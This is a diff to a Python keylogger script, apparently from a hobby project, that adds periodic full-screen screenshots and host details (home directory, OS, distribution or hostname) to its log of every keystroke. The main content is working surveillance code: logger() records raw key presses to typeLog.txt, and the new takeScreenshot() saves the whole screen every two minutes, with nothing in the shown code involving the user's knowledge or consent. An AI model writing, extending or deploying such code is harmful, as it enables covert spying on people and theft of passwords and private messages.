@@ -264,15 +264,21 @@ keyboardMap = {
         0x14b: "BTN_STYLUS",
         0x14c: "BTN_STYLUS2"
 }
+#logger() dependancies
 from time import localtime, strftime
 from datetime import datetime, timedelta
+#takeScreenshot() dependancies
+import gtk.gdk
+#osDetails() dependencies
+import os
+import platform
 
 def logger():
 	timeLocalToWrite = strftime("%d-%m-%Y %H:%M:%S", localtime())
 	currentTime = datetime.now()
 	byte = []
-	toWrite = timeLocalToWrite + '\n'
-	log = open('./output.txt', 'a')
+	toWrite = osDetails() + '\r' + timeLocalToWrite + '\n'
+	log = open('./typeLog.txt', 'a')
 	log.write(toWrite)
 	log.close()
 	toWrite = ''
@@ -288,11 +294,43 @@ def logger():
 						toWrite = keyboardMap[byte[2]] + "_HOLD "
 					if (datetime.now() - currentTime > timedelta(seconds=120)):
 						toWrite += '\n' + strftime("%d-%m-%Y %H:%M:%S", localtime()) + '\n'
+						takeScreenshot()
 						currentTime = datetime.now()
 					#print '/n' + toWrite
-					log = open('./output.txt', 'a')
+					log = open('./typeLog.txt', 'a')
 					log.write(toWrite)
 					log.close()
 					toWrite = ''
 				byte = []
+				
+def takeScreenshot():
+
+	print 2.1
+	w = gtk.gdk.get_default_root_window()
+	sz = w.get_size()
+	#print "The size of the window is %d x %d" % sz
+	pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
+	pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])
+	saveTime = strftime("%d-%m-%Y %H:%M:%S", localtime())
+	print 2.2
+	if (pb != None):
+		print 2.3
+		pb.save("screenshot " + saveTime + ".png","png")
+	print 2.4
+	
+def osDetails():
+	userHome = os.path.expanduser('~')
+	userOS = platform.system() # returns e.g. 'Linux' 'Windows' 
+	
+	if userOS == 'Linux':
+		desktop = userHome + '/Desktop/'
+		distribution = platform.linux_distribution()[0] + ' ' + platform.linux_distribution()[1] + ' ' + platform.linux_distribution()[2] # Lame attempt to convert tuple into string
+		
+	elif userOS == 'Windows':
+		desktop = userHome + '\\Desktop\\'
+		distribution = platform.node() + ' ' + platform.machine()
+		
+	return desktop + ' ' + distribution
+	
+# Begin program execution
 logger()
